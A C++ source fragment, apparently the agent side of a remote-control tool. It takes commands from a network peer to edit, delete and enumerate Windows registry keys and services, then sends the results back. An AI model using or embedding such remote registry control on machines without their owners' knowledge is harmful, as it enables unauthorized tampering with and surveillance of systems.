		pServices->dwServiceType = pConFig->dwServiceType;
		pServices->dwStartType = pConFig->dwStartType;
		pServices->dwTagId = pConFig->dwTagId;
		lstrcpy(pServices->lpBinaryPathName,pConFig->lpBinaryPathName);
		lstrcpy(pServices->lpDependencies,pConFig->lpDependencies);
		lstrcpy(pServices->lpLoadOrderGroup,pConFig->lpLoadOrderGroup);
		lstrcpy(pServices->lpServiceStartName,pConFig->lpServiceStartName);
		wsprintf((TCHAR*)pData, m_TempStr, pServices->m_Name);
		MyMainFunc::MyGetKeyStr(HKEY_LOCAL_MACHINE, (TCHAR*) pData, "Description", (BYTE*) pServices->lpDescribe);
	}
	delete [] pData;
	CloseServiceHandle(hServices);
}

void CMyMainTrans::SaveDataToTmpFile()
{
	HANDLE hFile = OpenMyTmpFile();
	if(hFile == INVALID_HANDLE_VALUE)
	{
		m_Command = CAN_NOT_CREATE_TMP_FILE;
		return;
	}

	DWORD nWriteLen = 0;
	if(!WriteFile(hFile, m_TransData, m_dTransLen, &nWriteLen, NULL))
	{
		CloseHandle(hFile);
		m_Command = CAN_NOT_CREATE_TMP_FILE;
		return;
	}
	CloseHandle(hFile);
}

void CMyMainTrans::MyRegEditValue()
{
	LPPSREGINFO pItem = (LPPSREGINFO) m_TransData;
	HKEY m_key = NULL;
	long ret = RegOpenKeyEx (pItem->m_RootKey, pItem->m_Key, 0, KEY_ALL_ACCESS, &m_key);
	if(ret != ERROR_SUCCESS)
	{
		m_Command = OPEN_REG_KEY_ERR;
		return ;
	}

	//设置新数据
	ret = RegSetValueEx(	m_key,
							pItem->m_ItemName,
							0,
							pItem->m_ItemType,
							(CONST BYTE *) pItem->m_ItemValue,
							pItem->m_ValueLen
						);
	if(ret != ERROR_SUCCESS)
	{
		RegCloseKey(m_key);
		m_Command = REG_EDIT_VALUE_ERR;
		return;
	}
	RegCloseKey(m_key);
}

void CMyMainTrans::MyRegDeleteValue()
{
	LPPSREGINFO pItem = (LPPSREGINFO) m_TransData;
	HKEY m_key = NULL;
	long ret = RegOpenKeyEx (pItem->m_RootKey, pItem->m_Key, 0, KEY_ALL_ACCESS, &m_key);
	if(ret != ERROR_SUCCESS)
	{
		m_Command = OPEN_REG_KEY_ERR;
		return ;
	}

	ret = RegDeleteValue(m_key, pItem->m_ItemName);
	if(ret != ERROR_SUCCESS)
	{
		RegCloseKey(m_key);
		m_Command = REG_DELETE_KEY_ERR;
		return ;
	}
	RegCloseKey(m_key);
}

void CMyMainTrans::MyRegDeleteKey()
{
	LPPSREGINFO pItem = (LPPSREGINFO) m_TransData;
	HKEY m_key = NULL;
	long ret = RegOpenKeyEx(pItem->m_RootKey, pItem->m_Key, 0, KEY_ALL_ACCESS, &m_key);
	if(ret != ERROR_SUCCESS)
	{
		m_Command = OPEN_REG_KEY_ERR;
		return ;
	}
	ret = SHDeleteKey(m_key, "");
	if(ret != ERROR_SUCCESS)
	{
		RegCloseKey(m_key);
		m_Command = REG_DELETE_KEY_ERR;
		return ;
	}
	RegCloseKey(m_key);
}

void CMyMainTrans::MyRegEnumKey()
{
	LPPSREGINFO pItem = (LPPSREGINFO) m_TransData;
	HKEY m_key = NULL;
	long ret = RegOpenKeyEx (pItem->m_RootKey, pItem->m_Key, 0, KEY_ENUMERATE_SUB_KEYS | KEY_QUERY_VALUE, &m_key);
	if(ret == 5 || ret != ERROR_SUCCESS)
	{
		m_Command = NOT_FIND_ANY_FILE;
		return;
	}

	DWORD		m_Index = 0;
	FILETIME	m_Time;
	HANDLE hFile = OpenMyTmpFile();
	if(hFile == NULL)
	{
		m_Command = CAN_NOT_CREATE_TMP_FILE;
		RegCloseKey(m_key);
		return;
	}
	
	DWORD nWriteLen = 0;
	REGINFO m_RegInfo = {0};
	REGINFO m_BakRegInfo = {0};
	while(1)
	{
		ZeroMemory(&m_RegInfo, sizeof(REGINFO));
		m_BakRegInfo.m_IsKey = FALSE;
		m_RegInfo.m_Datalen = 510;
		m_RegInfo.m_NameLen = 510;

		ret = RegEnumValue(m_key, m_Index, m_RegInfo.m_Name, &m_RegInfo.m_NameLen,
			NULL, &m_RegInfo.m_DataType, m_RegInfo.m_Data, &m_RegInfo.m_Datalen);
		if(ret != ERROR_SUCCESS)
		{
			//无新的值
			if(m_Index == 0)
			{
				m_BakRegInfo.m_DataType = REG_SZ;
				m_BakRegInfo.m_NameLen = 0xffffffff;
				m_BakRegInfo.m_Datalen = 0xffffffff;
				WriteFile(hFile, &m_BakRegInfo, sizeof(REGINFO), &nWriteLen, NULL);
			}
			break;
		}
		
		if(m_Index == 0)
		{
			if(lstrlen(m_RegInfo.m_Name) == 0)
			{
				m_RegInfo.m_NameLen = 0xffffffff;
				WriteFile(hFile, &m_RegInfo, sizeof(REGINFO), &nWriteLen, NULL);
				m_Index ++;
				continue;
			}
			m_BakRegInfo.m_DataType = REG_SZ;
			m_BakRegInfo.m_NameLen = 0xffffffff;
			m_BakRegInfo.m_Datalen = 0xffffffff;
			WriteFile(hFile, &m_BakRegInfo, sizeof(REGINFO), &nWriteLen, NULL);
		}
		WriteFile(hFile, &m_RegInfo, sizeof(REGINFO), &nWriteLen, NULL);
		m_Index ++;
	}

	m_Index = 0;
	while(1)
	{
		ZeroMemory(&m_RegInfo, sizeof(REGINFO));
		m_RegInfo.m_Datalen = 510;
		m_RegInfo.m_NameLen = 510;

		ret = RegEnumKeyEx(m_key, m_Index, m_RegInfo.m_Name, &m_RegInfo.m_NameLen, NULL, NULL, NULL, &m_Time);
		if(ret != ERROR_SUCCESS)
		{
			//无新的值
			break;
		}
		m_RegInfo.m_IsKey = TRUE;
		WriteFile(hFile, &m_RegInfo, sizeof(REGINFO), &nWriteLen, NULL);
		m_Index ++;
	}
	CloseHandle(hFile);
}

BOOL CMyMainTrans::ReadBag()
{
	if(m_TransData != NULL)
	{
		delete [] m_TransData;
		m_TransData = NULL;
	}
	return RecvDataWithCmd(&m_TransData, &m_dTransLen, &m_Command);
}

HANDLE CMyMainTrans::OpenMyTmpFile()
{
	DeleteFile(m_TmpFilePath);
	HANDLE hFile = CreateFile(m_TmpFilePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	return hFile;
}

BOOL CMyMainTrans::SendBag()
{
	m_dTransLen = 0;
	BOOL bRet = TRUE;
	BYTE* pSrcData = NULL;
	HANDLE hFile = CreateFile(
				m_TmpFilePath,  
                GENERIC_READ,   
                FILE_SHARE_READ,
                NULL,           
                OPEN_EXISTING,      
                FILE_ATTRIBUTE_NORMAL, 
                NULL);
	if(hFile != INVALID_HANDLE_VALUE)
	{
		m_dTransLen = GetFileSize(hFile, NULL);
		if(m_dTransLen != 0)
		{
			pSrcData = new BYTE[m_dTransLen];
			DWORD nReadLen = 0;
			ReadFile(hFile, pSrcData, m_dTransLen, &nReadLen, NULL);
		}
		CloseHandle(hFile);
		DeleteFile(m_TmpFilePath);
	}
	bRet = SendDataWithCmd(pSrcData, m_dTransLen, m_Command);
	if(pSrcData != NULL)
	{
		delete [] pSrcData;
	}
	return bRet;
}